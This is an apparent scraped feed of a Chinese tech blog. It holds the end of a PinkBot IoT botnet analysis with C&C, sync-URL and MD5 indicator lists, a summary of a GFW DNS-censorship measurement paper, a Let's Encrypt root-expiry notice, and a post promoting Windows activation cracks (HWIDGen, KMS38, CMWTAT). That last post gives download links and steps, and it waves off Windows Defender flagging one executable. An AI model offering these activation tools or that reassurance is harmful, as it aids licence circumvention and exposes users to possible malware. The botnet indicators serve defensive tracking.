&quot;dlc1&quot;:&quot;47ed94977b45099f1ef5c7701b2d25dc&quot;, &quot;dl1&quot;:&quot;https://****.com/****/dlist.txt&quot;, &quot;sd0&quot;:&quot;1.1.1.1&quot;, &quot;sdp0&quot;:&quot;443&quot;, &quot;srvk&quot;:&quot;FJAz37XiKgnTLtVpmhjxZcavTJUU5r4XN3Wl5nhTpg0=&quot;, &quot;pxy&quot;:&quot;1&quot; } 当前规模 我们一直阶段性的对公网上的 Pink 节点进行持续监测，通过对 2021/10/20日的日志分析，我们仍然可以看到 103024 个 IP 处于日活状态。这表明，当前的 pink 的感染规模仍然在 10万量级左右，涉及多家设备厂商，按照每个IP对应一个三口之家来计算，受影响人群大概 30万人左右。按照每个光猫 100 元的更换成本计算，当前仍有上千万损失等待弥补。 曾发起 DDoS 攻击 文章编写完成时，我们并没有抓到 Pink 发起 ddos 攻击的指令，但在随后的一段时间中，我们监测到了大概100多条试图发起 DDos 攻击的指令，下面筛选其中的两条，供参考： 2020/3/24 通过UDP协议，攻击 203.56.252.137:26999 2020/4/8 通过HTTP协议，攻击 180.101.192.199:27020 Pink 对抗的能力 在对 Pink 僵尸网络分析跟踪的过程中。我们注意到，攻击者和不同厂商进行过多次的攻防对抗。 这一章节将简单介绍下在对抗中， Pink 展现出来的一些能力。 设备厂商的博弈 根据相关厂商之一提供的信息，对抗最早发生在 2019 年 11 月中旬。受攻击的漏洞源于一个 TCP-17998 的管控服务，该服务是对运营商提供的一个管理家用光猫的接口。由于服务配置和实现的失误，向公网开放了访问权限，攻击者通过它获取了相关光猫的控制权。 第一次对抗: 厂商在发现这个问题后，开始试图在公网上通过相同的漏洞，修复自家设备。但很快就被攻击者发现并马上采取行动，通过 iptables 关闭了 TCP-17998 的外网访问能力，从设备内部阻止了厂商的进一步修复。 第二次对抗：此次攻防的焦点在 tr069 升级通道。厂商从运营商侧可以在设备启动瞬间利用 tr096 进去修复设备。然而此次攻击者仍然在第一时间察觉到问题，并迅速更新固件关掉了tr096 的更新通道。 第三次对抗：厂商又尝试利用设备上 LAN 侧的 TCP-80 HTTP 服务来进行设备修复，然而，同样的结局，攻击者很快又更新固件把设备上的 HTTP 服务文件干掉了。至此，所有的光猫都成了网络孤岛，它们只能提供终端用户的正常网上冲浪的能力，却再没有网络端口可以供外侧管理访问。 最后的方案：厂商已经完全没有还击的筹码了。如果要修复这些孤岛，只能派人入户接触光猫，拆解出调试接口或者干脆为用户更换光猫。 复盘总结：设备厂商与攻击者多轮的攻防对抗中，双方的信息和能力是不对等的。厂商在无法获知全网受害情况的前提下，从互联网上一个IP一个IP的发现设备/修复设备。而攻击者通过集中C&amp;C的机制，统一下发关服务指令。虽然，厂商修复了一部分设备得到了局部胜利，但攻击者仍然保住了大部分胜利果实获取了全局胜利。 另一方面，将物联网设备供应商与成熟的系统供应商在安全能力方面对比（例如Windows、安卓或者MacOS），后者拥有成熟的多的安全人员建制和丰富的多的安全对抗经验。再考虑到物联网设备数量众多，多得多的数量加上少的多的防御，更多的攻击转向物联网设备是老道攻击者的自然选择。 GitHub 封相关账号 我们在实际跟踪中通过残留的早期指令发现，PinkBot 至少已经存在一年以上了，最早可以追溯到 2018年10月16日，当时使用的 github 帐号为 pink78day（这个账号早就已经看不到了，我们通过搜索Google的网页快照服务追溯）。 目前 PinkBot 使用的帐号是 2019年11月下旬注册的 mypolo111，而 pink78day 这个账号已经无法在 GitHub 上搜索到，所以我们推测，Github 在发现这个项目后对帐号采取了屏蔽措施，而最近一次攻防也就发生在 2019年11下旬 PinkBot 换帐号这个时间点。 复盘总结：对于GitHub来说，PinkBot 数量巨大，且访问的项目是一个明显恶意的项目，会消耗较多的服务资源，于情于理，GitHub 都要封杀这个僵尸网络。问题在于，他们误认为 pink78day 是一个集中分发指令的渠道，以为单纯封杀这个账号就没事了。但事实上，这个账号只是一个相对下游的控制手段。攻击者通过增加BTC钱包的交易记录就可以瞬间将Bot重定向到一个新的账号上。消耗资源的问题依然存在，此次攻防无所谓成功失败。 IOC C&amp;C地址 通过长期跟踪，攻击者使用过的CNC地址有： cnc.pinklander.com 144.202.109.110:40080 144.202.109.110:32876 207.148.70.25:12368 45.32.125.150:12368 45.32.125.188:12368 45.32.174.105:12368 5.45.79.32:12368 同步服务 PinkBot 会通过HTTP服务同步样本，用于更新或扩大感染。所用的HTTP服务有一些是公有服务，有一些是临时建立的HTTP服务。 在长期的跟踪中，我们确定至少存在以下URL被用于样本同步。这些URL均提取自 PinkBot 的配置信息中。 http://1.198.50.63:1088/dlist.txt http://1.63.19.10:19010/var/sss/dlist.txt http://104.207.142.132/dlist.txt http://108.61.158.59/dlist.txt http://111.61.248.32:1088/dlist.txt http://112.26.43.199:81/dlist.txt http://113.106.175.43:19010/tmp/pinkdown/dlist.txt http://117.131.10.102:1088/d/dlist.txt http://123.13.215.89:8005/d/dlist.txt http://125.74.208.220:81/dlist.txt http://140.82.24.94/dlist.txt http://140.82.30.245/d/dlist.txt http://140.82.53.129/dlist.txt http://144.202.38.129/dlist.txt http://149.28.142.167/p/dlist.txt http://149.28.142.167/p1/dlist.txt http://155.138.140.245/dlist.txt http://167.179.110.44/dlist.txt http://173.254.204.124:81/dlist.txt http://182.139.215.4:82/dlist.txt http://207.148.4.202/dlist.txt http://218.25.236.62:1987/d/dlist.txt http://218.25.236.62:1988/d/dlist.txt http://222.216.226.29:81/dlist.txt http://45.32.26.220/dlist.txt http://45.76.104.146/dlist.txt http://45.77.165.83/p1/dlist.txt http://45.77.198.232/p1/dlist.txt http://45.88.42.38/p1/dlist.txt http://61.149.204.230:81/dlist.txt http://66.42.114.73/dlist.txt http://66.42.67.148/dlist.txt http://8.6.193.191/dlist.txt http://95.179.238.22/dlist.txt https://raw.githubusercontent.com/pink78day/helloworld/master/dlist.txt MD5 通过跟踪获取到的相关样本（ELF）汇总如下： 9ec5bd857b998e60663e88a70480b828 /bin/protect 451a3cf94191c64b5cd1be1a80be7799 /bin/tr69c 06d6ad872e97e47e55f5b2777f78c1ba slient_l 07cd100c7187e9f4c94b54ebc60c0965 slient_b 0f25b0d54d05e58f5900c61f219341d3 client_b 0f89e43ea433fdfd18a551f755473388 slient_l 1197994610b2ffb60edbb5ab0c125bc0 client_b 167364ad0d623d17332f09dbb23a980e client_b 175b603082599838d9760b2ab264da6f slient_l 1a6dce9916b9b6ae50c1457f5f1dfbbd slient_l 229503686c854bb39efdc84f05b071b9 slient_b 25a07e3ef483672b4160aa12d67f5201 client_l 262a4e242c9ebeba79aa018d8b38d229 client_l 29d0afd2a244c9941976ebf2f0f6597f client_l 2befedd020748ff6d9470afad41bd28c slient_b 2ca5810744173889b2440e4f25b39bd4 client_l 36e48e141943a67c6fdeaa84d7af21cc client_b 3a620ff356686b461e0e1a12535bea24 slient_l 41bbe8421c0a78067bae74832c375fe8 slient_l 45ee78d11db54acfdda27c19e44c3126 client_l 4830c3950957093dac27d4e87556721e slient_l 484761f281cb2e64d9db963a463efca5 client_l 48a7f2799bf452f10f960159f6a405d3 client_l 494412638dc8d573172c1991200e1399 client_l 4c83ad66189a7c4d2f2afdbfb94d0e65 slient_b 50270de8d5783bb0092bf1677b93c97b slient_l 54aa9e716567bd0159f4751916f7f0d1 client_l 5ae1fec20c2f720269c2dc94732187e8 slient_b 5b62a9bd3431c2fd55283380d81c00fa client_b 5c322610e1845d0be9ccfc8a8b6a4c4f client_l 5c4f8dae67dad8cac141afa00847b418 slient_b 5d0d034845bd69179bf678104c046dc1 client_b 60658ef214c960147200d432eece3e13 slient_l 60a2b1bb02a60ac49f7cc1b47abdf60c client_l 610f0aadba3be1467125607bf2ba2aaf slient_l 66a068fd860bda7950fde8673d1b5511 client_b 6c4de9bd490841f0a6c68638f7253c65 client_b 72c531a813b637af3ea56f288d65cdb7 slient_b 7608b24c8dcf3cd7253dbd5390df8b1f client_b 7645a30a92863041cf93a7d8a9bfba1a client_b 857fc3c7630859c20d35d47899b75699 slient_b 861af6b5a3fea01f2e95c90594c62e9d client_l 8e86be3be36094e0f5b1a6e954dbe7c2 client_l 8fbcd7397d451e87c60a0328efe8cd5d client_b 987a9befb715b6346e7ad0f6ac87201f slient_b 9eb147e3636a4bb35f0ee1540d639a1b slient_b aa2fc46dd94cbf52aef5e66cdd066a40 client_l ae8b519504afc52ee3aceef087647d36 slient_b b0202f1e8bded9c451c734e3e7f4e5d8 slient_b b6f91ad027ded41e2b1f5bea375c4a42 slient_b b9935859b3682c5023d9bcb71ee2fece slient_b b9d1c31f59c67289928e1bb7710ec0ba client_l bec2f560b7c771d7066da0bee5f2e001 client_b c2efa35b34f67a932a814fd4636dd7cb slient_l c839aff2a2680fb5676f12531fecba3b slient_b c94504531159b8614b95c62cca6c50c9 slient_l dfe0c9d36062dd3797de403a777577a6 client_b e19a1106030e306cc027d56f0827f5ce slient_l f09b45daadc872f2ac3cc6c4fe9cff90 client_b f5381892ea8bd7f5c5b4556b31fd4b26 client_b f55ad7afbe637efdaf03d4f96e432d10 slient_b f62d4921e3cb32e229258b4e4790b63a client_b f81c8227b964ddc92910890effff179b slient_b fc5b55e9c6a9ddef54a256cc6bda3804 client_b fe8e830229bda85921877f606d75e96d slient_l fee6f8d44275dcd2e4d7c28189c5f5be client_l ","link":"https://blog.gd1214b.icu/post/WyCiS5dGg/"},{"title":"互联网的刻耳柏洛斯:GFW的DNS审查系统","content":" 本文转自：https://yangxiamao.github.io/2021/09/30/互联网的刻耳柏洛斯-GFW的DNS审查系统/ 刻耳柏洛斯是希腊神话中看守冥界入口的恶犬，它允许每一个死者的灵魂进入冥界，但不让任何人出去，同时也不允许活人进入。 纽约大学石溪分校的 Nguyen Phong Hoang 和多伦多大学的 Arian Akhavan Niaki 等人，建立了一个名为 GFWatch 的网络平台，对中国网络长城（俗称 GFW）的 DNS 审查系统进行了探测和实验，最后写出了一篇论文发表在历史悠久的 USENIX（高等计算系统协会）的相关会议上。文章名为《How Great is the Great Firewall? Measuring China’s DNS Censorship》，您可通过链接 https://www.usenix.org/system/files/sec21-hoang.pdf 获得论文原文。 在 GFWatch 工作的九个月时间里，它测试了 5.34 亿个域名。论文展示了一组触目惊心的数据：至少有 31.1 万个域名被 GFW 的 DNS 过滤系统干扰。并且 GFW 还主动出击，在世界范围内污染了公共 DNS 解析服务（public DNS resolvers）中至少 7.7 万个域名的数据，其中包括谷歌和 Cloudflare 的 DNS 解析器。 他们在论文中说： “These techniques will not only help public DNS resolvers and other DNS-related services to sanitize tainted records, but can also assist future development of circumvention tools tobypass the GFW’s DNS censorship.” 他们的研究不仅可以帮助清除 DNS 解析器和其他 DNS 相关服务中污染了的 DNS 数据，还可以帮助今后的开发人员去开发绕过 GFW 的 DNS 审查系统的工具。 GFW 如何污染 DNS DNS （Domain Name System）的作用是根据域名查出IP地址。它是一个将域名和IP地址相互映射的分布式数据库，你可以把它想象成一本巨大的电话本。 举一个例子，如果我们要访问域名 www.baidu.com ，首先要通过 DNS 查出它的IP地址 183.232.231.172。下图是 DNS 查询的一个简单示意图。 论文中提到，由于 GFW 是一个通路的（on-path）/旁观者（man-on-the-side）的系统 ，所以它没办法通过修改或者简单丢弃互联网上传输的那些被封锁的域名的 DNS 查询响应。但是由于 DNS 使用无状态、未加密的 UDP 协议进行传输，所以 GFW 可以通过可以实时监测互联网上的流量，当在用户的 DNS 查询中检测到受审查的内容时，注入错误的响应。 由于 GFW 的相关设备通常离客户端更近（就物理/网络距离而言），所以被检测的响应通常会比合法的响应更早到达，从而达到让用户无法获得正确的域名的 DNS 的目的。 利器：观测 GFW 的平台 GFWatch 当你凝视深渊时，深渊也在凝视着你。 GFWatch 的设计要求中，有一点就是要可以探测到尽可能多的被 GFW 阻断的网站。GFWatch 从 超过 1500 个TLD zone file 处获得实时更新的域名列表，平均每天会对 4.11 亿个网站进行监测，截至 2020 年总共探测了 5.34 亿个网站。发现至少有 31.1 万个域名被 GFW 的 DNS 过滤系统干扰。 GFWatch 同时被设计以可以实行长期探测。一旦它探测到某个网站被封锁，GFWatch就会持续对这个网站进行观测，观察这个网站是否会在某个时间点被 GFW 解封。 同时，GFWatch 还被设计来收集统计 GFW 返回的虚假 IP 地址。 接下来我们来看看 GFWatch 的实验和探测手段。 GFWatch 的主要探测器位于没有 DNS 审查制度的美国，从这台机器发送 DNS 查询消息前往位于中国的两台主机。但是位于中国的那两台主机并没有 DNS 解析能力，因此，主探测器的任何 DNS 响应都应该是来自 GFW。 因为 DNS query 使用 UDP，所以 GFWatch 也被设计为使用 UDP 进行探测。而 UDP 是一个无状态和不可靠的协议，数据包可能会由于不受控制的因素（例如，网络拥堵）而丢失。为了尽量减少这些因素对数据收集的影响，GFWatch 每天至少对每个域名进行三次测试。 很妙的一个实验方法！一个优秀的猎手往往以猎物的姿态存在。虽然你耗费了电费和带宽，但是你可是钓上了 GFW 这条大鱼啊！ 中国的两台主机位于两个不同的自治系统（AS）中。但是从探测结果来看，发往这两台中国主机的 DNS 查询所接受的封锁政策是相同的，故研究人员猜测 GFW 应该是采用中心化政策（centralized blocking policy）的一个系统。 在位探测仪完成每个探测批次后，被检测到的受审查域名被转移到中国主机上， 接着，研究人员又控制位于中国境内的主机向位于美国的主机发送网站的 DNS 查询信息。研究人员观察到从美国发往中国的 DNS 查询时会被审查的域名在中国发往美国时同样会被审查。 通过两个探测路径探测到了相同的被审查的域名名单。 截至论文发表时，GFWatch 仍在运行，每天都在收集数据。 从 GFW 封锁网络清单中反推规则 无论多么天衣无缝的犯罪，只要是人作的，就没有解不开的道理。 ——阿瑟·柯南·道尔《福尔摩斯全集》 如果 subdomain.example.com 和 example.com 的所有子域都被封锁，研究人员就将 example.com 视为一个被封锁的域名（blocked domain）。最短的审查域名便称为 “基础域名”（base domain）。通过对 GFWatch 发现的 31.1 万个被审查的域名进行分析，研究人员发现了 13.87 万个基础域名。截至 2020 年 12 月 31 日，仍存在 12.6 万个被封禁的基础域名。 但是研究人员同时注意到，当一个子域名被封锁时，基础域名可能不会被封锁。例如，cs.colorado.edu 被封锁了，而 colorado.edu 没有被封锁，这说明 GFW 没有简单地采用一刀切的封锁措施。于是研究人员进一步的进行了分类，对于一个给定的域，研究人员测试了每个审查的域和随机字符串的以下排列组合。 Rule 0 censored_domain Rule 1 censored_domain{.rnd_str} Rule 2 censored_domain{rnd_str} Rule 3 {rnd_str.}censored_domain Rule 4 {rnd_str}censored_domain Rule 5 {rnd_str.}censored_domain{.rnd_str} Rule 6 {rnd_str.}censored_domain{rnd_str} Rule 7 {rnd_str}censored_domain{.rnd_str} Rule 8 {rnd_str}censored_domain{rnd_str} 在 138.7 万个基础域名中，有 11.8 万个域名根据规则 0 进行是独立审查的。换句话说，这些域名是被审查的，但在与随机字符串连接时不会触发GFW的DNS审查。 在这些规则中，只有规则 1 和 3 是基础域名的子域名的正确存在形式。研究人员把规则 1、3 以外的规则与较短的域名字符串组合在一起的被审查的域名称为被过度封锁（overblocked）的域名。 按照封锁严重程度的升序，研究人员发现在规则2、3、4、6和8下，分别有4、11.38 万、1.09 万、1400 个和 696 个不同的基础域名被封锁。 对 GFW 过度封锁的研究 有超过 1.3 万个基础域名被过度封锁。在发现的 33.1 万个被审查的域名中，有 41000 个域名是过度封锁的。 论文中举了一个例子：GFW 将 torproject.org 进行了严格审查，对其进行了过度封锁（overblocked）。包括 mentorproject.org 在内，任何包含了 torproject.org 字段的网站都被 GFW 封锁，令人啼笑皆非。（Tor 是一个旨在实现匿名通信的自由软件（free software），Tor 用户的互联网活动相对较难追踪。） 919.com、jetos.com 和 33a.com 这三个域名共造成15000个不相关的域名被过度封锁，如果有朋友打算购买域名，请注意避开包含有相关子字符串的域名。以避免被 GFW 不明不白的封锁了。 对被封域名种类的研究 研究人员使用了 FortiGuard 提供的服务，进行域名分类。 统计发现，“商业”（business）、“色情”（pornography）和 “信息技术”（information technology）这三种网站是 GFW 封锁的主要类型（除了未分类的网站外）。 另外一项没有没有统计子域名的研究则发现，“代理”（proxy avoidance）和 “个人网站和博客”（personal websites and blogs）是被封锁最多的网站类型。 虽然 &quot;教育&quot; 不是被审查的首要类别，但研究人员同时发现了许多与教育有关的域名被封锁，包括 mit.edu、umich.edu、gwu.edu、armstrong.edu、brookings.edu、citizenlab.ca、feitian.edu、languagelog.ldc.upenn.edu、pori.hk、soas.ac.uk、 scratch.mit.edu、cs.colorado.edu…… 这是 GFW 滥封网站的又一个证据。 COVID-19、自动化工具与雇员 GFWatch 检测到大量与 COVID-19 有关的域名被 GFW 通过 DNS 篡改进行审查，包括 covid19classaction.it、covid19song.info、covidcon.org、ccpcoronavirus.com、covidhaber.net 以及 covid-19truth.info 等网站。 虽然大多数 COVID-19 相关的网站在出现后很快被 GFW 发现并封锁，但研究人员发现 GFW 无法做到实时封禁相关网站。 ccpcoronavirus.com 和 covidhaber.net 于 2020 年 4 月首次出现在 GFWatch 的测试列表上，但分别直到 7 月和 9 月才被 GFW 封杀。同样的，covid-19truth.info 在 2020 年 9 月出现在研究人员的数据集中，但直到 10 月才被审查。 GFW 审查不同域名所需时间的巨大差异表明，封锁网站名单很可能是由自动工具和人工共同完成的。 伪造的 IP 与被蒙蔽的人们 真理是永远蒙蔽不了的。 了解 GFW 伪造的 IP 和它们被注入的模式（如果有的话）是至关重要的。 研究人员分析了 GFWatch 收集的 IP，以研究是否存在任何特定的注入模式，在此基础上，我们可以制定策略来有效地检测和绕过 GFW 的 DNS 审查制度。 伪造的 IP 的数量随时间流逝增加 研究人员从 GFWatch 捕获的所有中毒的 DNS 响应中发现了 1781 和 1799 个伪造的 IPv4 和 IPv6 地址。 研究人员发现所有被 GFW 注入的 IPv6 地址都是假的，因此，研究人员把分析的重点放在伪造的IPv4地址上。 从 2020 年 5 月份开始，GFWatch 监测到 GFW 使用的伪造 IP 数量开始增多，在2020年的最后四个月，伪造的 IP 数量增长到 1700 个左右。 有迹可循：伪造 IP 的注入模式 通过分析每个伪造 IP 地址的注入频率，我们发现并不是所有的伪造 IP 都有同样的机会被注入到被审查的回应中，也就是说，他们的注入模式并不是完全随机的。 尽管 GFW 伪造的 IP 数量迅速增加，但最初的 200 个伪造的 IP 仍然对 99% 的 DNS 注入负责。从 5 月到 8 月发现的新的的 1300 个伪造 IP 位于长尾部分，研究人员只在 1% 的 GFW 伪造的 DNS 响应中发现了它们。 根据这一试验结果，我们或许获得了些许反制 GFW DNS 污染的灵感。 围城：双向拦截 城外的人想进去，城里的人想出来 因为有时 DNS 查询的信息不可避免的会经过中国网络，触发 GFW 的双向 DNS 过滤行为，故先前研究人员曾认为 这是中国境外的公共 DNS 解析器缓存被污染的原因。 经过进一步的研究，研究人员发现许多域名的权威名称服务器（authoritative name servers）位于中国境内是另一个主要原因，这些中毒的 DNS 缓存借此玷污了世界各地的许多公共 DNS 解析器。 GFWatch 发现的被审查的域名和 GFW 伪造的 IP 的数据集有助于检测和净化公共 DNS 解析器缓存中的中毒资源记录。 GFW 对中国域名的地理封锁 2020 年 8 月 8 日，GFWatch 检测到 GFW 一个奇怪的封锁行为：GFW 对中国政府网站进行了审查阻断。 www.beian.gov.cn 名为“全国互联网安全管理服务平台”，由中国工业和信息化部管理。这个域名有两个权威的名称服务器，dns7.hichina.com 和 dns8.hichina.com，它们被托管在 16 个不同的中国境内的 IP 地址上。一旦在中国境外发出向针对该网站的 DNS 查询，GFW 便会对查询进行污染与注入。但位于中国境内的主机仍然可以正常访问这个网站。 因此，这是一个明显的地理封锁案例。GFW 不仅仅封堵了主机从中国向境外被审核网站的访问，也污染了境外主机向中国境内部分网站访问时的 DNS 查询。 从中国境外访问 www.beian.gov.cn 会间歇性地成功，因为 GFW 的 DNS 注入有时会比正确的响应更晚到达使用终端。 GFW 大炮 研究人员提到了 GFW 发动资源耗尽攻击（resource exhaustion attacks）的可能性。 一旦 GFW 将 DNS 查询的结果大量导向某个 IP 地址，受影响的组织将在服务器上付出不可忽视的开销。 GFW 甚至可以针对一个 DNS 查询发出多达三个伪造响应。从GFW的角度来看，注入多个虚假响应不仅增加了成功污染查询结果的可能性，也使检测和规避 DNS 污染的成本增高，难度增大。 如烛者，思至则见，不思不见 你就是这道黑暗中强烈的光束，从属于你的夜晚中，照亮了他们曾经看不见的白天。 ——爱德华·勒维 一旦 GFWatch 检测到有域名被 GFW 封锁，研究人员就向公共的 DNS 解析器查询它们。最终，研究人员发现了公共 DNS 解析器的缓存中，有 7.7 万个被 GFW 审查的域名被污染。下图显示了数据被污染得最多的前十个公共 DNS 解析器。 这一发现显示了 GFW 在世界范围内的广泛影响，使得公共的 DNS 解析器的操作者必须有一个有效的机制来防止这些中毒的资源记录污染他们的缓存，以保证他们的DNS服务质量。 现在，研究人员将展示如何根据前文展示的 GFW 的特点和 GFWatch 获得的浩如烟海的数据制定策略，以有效和高效地规避 GFW 的 DNS 审查制度。 当收到一个以上的 IPv6 回应时，客户端可以根据 GFW 伪造的 IPV6 的显著特点排除掉被污染的 IP 地址。对于 IPv4 答案，客户端可以根据前文中发现的 GFW 伪造 IP 的注入模式和伪造的 IPv4 特点来检查它们。 从下图中，我们可以看到 99% 的被 GFW 污染的 DNS 响应比正确的响应提前 364ms 到达我们的机器（这个延迟时间根据终端和 GFW 之间的相对距离的不同而可能会有所不同）。换句话说，在查询一个受审查的域名 IP 时，收到 GFW 设备发出的 DNS 响应时，客户端最多应该多等 364ms，以等待正确 IP 的到来。 愿我们能够在没有黑暗的地方相遇 人类收到火的礼物之后，国王会用它征服世界，厨师会用它喂养世界，工程师会用它移动世界。小丑只会用它玩杂耍。 研究团队开发了 GFWatch，监测并统计了 GFW 基于 DNS 审查的封锁行为。然而，DNS 审查并不是 GFW 使用的唯一的封锁技术，还有其他许许多多的技术被采用来防止信息在互联网间自由的流通。例如，基于 SNI 的封锁、基于关键字的过滤、针对特定 IP 的封锁、使用深度包监测识别异常流量…… 本篇文章以 MIT 协议开源，欢迎任何人转载、引用。祝您生活愉快、学业、事业顺利。 ","link":"https://blog.gd1214b.icu/post/o8OKv2apb/"},{"title":"Let's Encrypt根证书过期预警 请在9月30日前及时更新","content":" 安全研究员 Scott Helme 警告称：作为全球最大 HTTPs 证书提供商之一的 Let's Encrypt，即将于下周停用旧版根证书（Root CA）。这意味着数百万计依赖它的网站必须在 9 月 30 日前及时更新，不然将面临不受计算机、设备或 Web 浏览器信任的困扰。 据悉，Let's Encrypt 是一个由非营利性组织 互联网安全研究小组（ISRG）提供的免费、自动化和开放的证书颁发机构(CA)，简单的说，就是为网站提供免费的 SSL/TLS 证书。数据显示，自2014年成立以来，截止2021年9月初，Let’s Encrypt已经总计已经颁发了超过20亿份证书，目前已经为2.6亿个网站提供 TLS 证书。 早在2020年，Let’s Encrypt就宣布其服务使用的一个由IdenTrust提供的根证书DST Root CA X3将于2021年9月1日到期，它将用自己命名为ISRG Root X1的根证书为过期做准备。此次，Let’s Encrypt停用旧版根证书将有一大批网站遭到影响。 然而 Let's Encrypt 当前使用的 IdentTrust DST Root CA X3 根证书，也即将于下周过期。对于大部分网站的访客来说，9 月 30 日可能是个波澜不惊的一天。 但是对于较旧的设备来说，可能还是会遇到一些问题 ——正如 AddTrust External CA Root 在今年 5 月遭遇的根证书过期中断那样，造成Stripe、Red Hat 和 Roku 都受到了影响。 Scott Helme 在一篇博文中写道：“考虑到 Let's Encrypt 和 AddTrust 之间的体量差异，我有预感 IdenTrust 根证书到期时又会让历史重演，甚至可能引发更多的问题”。 如果你的网站使用的Let's Encrypt品牌根证书过期的话，就会出现的网站兼容性降低，甚至部分网站不能访问的现象，而这无疑会严重影响用户体验。 当然，潜在易受影响的，主要是那些不怎么定期更新的设备 —— 比如嵌入式系统、或运行多年前软件版本的智能手机。 目前已知以下软件或设备会受到影响： OpenSSL &lt;= 1.0.2 Windows &lt; XP SP3 macOS &lt; 10.12.1 iOS &lt; 10 (iPhone 5 及以上的型号可以更新到 iOS 10) Android &lt; 7.1.1 (但是 &gt;= 2.3.6 的版本可以在交叉签名了 ISRG Root X1 根证书的前提下工作) Mozilla Firefox &lt; 50 Ubuntu &lt; 16.04 Debian &lt; 8 Java 8 &lt; 8u141 Java 7 &lt; 7u151 NSS &lt; 3.26 Amazon FireOS (Silk Browser) 以下软件或设备可能会受到影响： Cyanogen &gt; v10 Jolla Sailfish OS &gt; v1.1.2.16 Kindle &gt; v3.4.1 Blackberry &gt;= 10.3.3 PS4 game console with firmware &gt;= 5.00 IIS 鉴于 Android 生态有着长期存在且众所周知的问题，为了防止大多数智能机受到本次事件的影响，Let's Encrypt 已于今年早些时候未雨绸缪地过渡到了自家的 ISRG Root X1 证书（到期时间为 2035 年）。 虽然包括 Android 7.1.1（Nougat）及更早版本的设备并不信任它，但 Let's Encrypt 还是能够通过对自颁证书进行交叉签名的方式，让大多数 Android 设备可在未来三年内避免受到波及。 但若你还想在 Android 5.0（Lollipop）上安装 Firefox，最好还是尽早为迁移至新平台做打算。 ","link":"https://blog.gd1214b.icu/post/7H8zpCstc/"},{"title":"Windows激活之路","content":"数字权利激活 何谓“数字权利激活”？ 数字许可证（在Windows 10 版本1511 中称为数字授权）是Windows 10 的一种激活方法，该方法不需要输入产品密钥。 在同一台电脑上主要硬件（应该是CPU和主板）不变化的情况下，重新安装系统时无需再次输入密钥，系统会在自动连接到微软服务器进行激活。 1.Win10 获取数字许可证批处理版(萌咖定制) 下载地址 点击下面的链接下载： https://cdn.gd1214b.tk/Windows_Active_Tools/Win10Activation.exe 前言 萌咖大佬在 @demonsya 大佬的版本上添加了几个可能需要的功能。 优化了批处理执行逻辑，失败自动重试。 兼容大于等于 win7(win server 2008) 的各个版本的激活信息(包括Office)查询，备份，还原。 自动激活(获取数字许可证)只支持win10,以后重装只要联网就会自动激活,无需输入许可证密钥。 这是Windows10特有的方式，非KMS 180天循环激活。 注意事项 激活时请保持电脑连网状态，否则无法顺利激活。 激活时请保持 Windows Update 服务为启动状态。 如果已使用密钥激活 Office 等产品，会丢失其激活状态。 建议备份激活信息后再操作。 功能列表 自动激活并获取数字激活许可证。 删除(初始化)系统激活信息。 备份系统激活信息。 还原系统激活信息。 查看激活状态。 查看支持列表。 支持的Windows版本 Windows 10 Cloud Windows 10 CloudN Windows 10 Core Windows 10 CoreN Windows 10 CoreCountrySpecific Windows 10 CoreSingleLanguage Windows 10 Education Windows 10 EducationN Windows 10 Enterprise Windows 10 EnterpriseS / LTSB Windows 10 EnterpriseN Windows 10 EnterpriseSN / LTSBN Windows 10 Professional Windows 10 ProfessionalN Windows 10 ProfessionalEducation Windows 10 ProfessionalEducationN Windows 10 ProfessionalWorkstation Windows 10 ProfessionalWorkstationN 2.数字激活 HWIDGen v62.01 汉化版 下载地址 https://cdn.gd1214b.tk/Windows_Active_Tools/HWIDGen_62.01_ZH_CN.exe 此文件Windows Defender 会报毒，但经本人检测并无病毒 概述 HWIDGen 是一款由国外Nsane论坛会员s1ave77制作的Windows 10数字权利激活工具，这款Win10数字权利获取工具，可以自动获取Windows 10 数字许可证激活，无需产品密钥，以最简单的方式永久激活。 原理 通过修改系统内核数据来激活系统，具体请看源码：https://github.com/vyvojar/slshim 默认情况下当Windows 10被激活后会自动生成与硬件ID对应的许可证，该许可证会存储到微软的服务器上。当系统重新安装时自动将硬件ID提交给微软检索对应的许可证，若许可证符合则系统自动激活无需用户操作。日前在国外科技论坛有大神发布名为HWIDGEN激活工具，该激活工具几乎秒杀所有版本Windows 10系统。我们知道Windows 10现在激活后会带有数字权利，数字权利可以在我们重装系统后自动激活无需再次激活。而HWIDGEN激活工具正是直接获取数字激活权利进行永久激活，此方法激活后用户下次安装同样无需激活。 激活方式 支持的版本 家庭版（数字权利/KMS38™） 家庭单语言版（数字权利/KMS38™） 专业版（数字权利/KMS38™） 专业教育版（数字权利/KMS38™） 专业工作站版（数字权利/KMS38™） 教育版（数字权利/KMS38™） 企业版（数字权利/KMS38™） 企业版S 2015（数字权利） 企业版S 2016（数字权利/KMS38™） 企业版S（KMS19™） ServerStandard(Core)（KMS38™） ServerDatacenter(Core)（KMS38™） ServerSolution(Core)（KMS38™） 3.云萌 Windows 10 激活工具 下载地址 https://cdn.gd1214b.tk/Windows_Active_Tools/CMWTAT_Digital_Release_2_5_0_0.exe 使用 入门 使用自动模式激活 Windows 10 下载上面链接中的文件。 运行它。 点按 激活 按钮。 完成~ 进阶 在不同版本 Windows 10 之间转换 注意: 目前已知 Windows 10 的 专业版（Professional）、专业工作站版（ProfessionalWorkstation）、教育版（Education）、专业教育版（ProfessionalEducation）、企业版（Enterprise） 之间可以进行互相转换（N版本与LTSB版本除外），而这些版本与家庭版（Core）均不能一键转换，如需转换请使用 Windows设置 中的 更改产品密钥 功能进行升级。 自动模式 运行程序。 选择 自动模式 。 在下拉列表中选择要升级到的版本。 点按 版本无缝转换 按钮。 完成。 手动模式 运行程序。 选择 手动模式 。 输入框中输入需要升级到的版本对应的OEM零售密钥（不需要产品包装上的激活密钥，而是微软官方分配的密钥，如专业版对应密钥为 VK7JG-NPHTM-C97JM-9MPGT-3V66T）。 点按 激活 按钮。 完成。 通过 手动模式 激活不在列表中的 Windows 10 版本 注意: 此方法不适用于某些版本的激活，如 专业教育版（ProfessionalEducation） ，即使你输入了对应的OEM零售密钥。 运行程序。 选择 Manual Mode 。 输入框中输入需要升级到的版本对应的OEM零售密钥（不需要产品包装上的激活密钥，而是微软官方分配的密钥，如专业版对应密钥为 VK7JG-NPHTM-C97JM-9MPGT-3V66T）。 点按 版本转换 按钮。 完成。 启动参数 -? --help 启动后弹出启动参数帮助对话框。 -a --auto 启动后自动激活系统。 -e --expact 自动激活系统时允许使用实验性方案。（需要与 -a 或 --auto 配合使用） -h --hide 以隐藏模式启动，激活进度以通知形式显示。（需要与 -a 或 --auto 配合使用） 参考资料 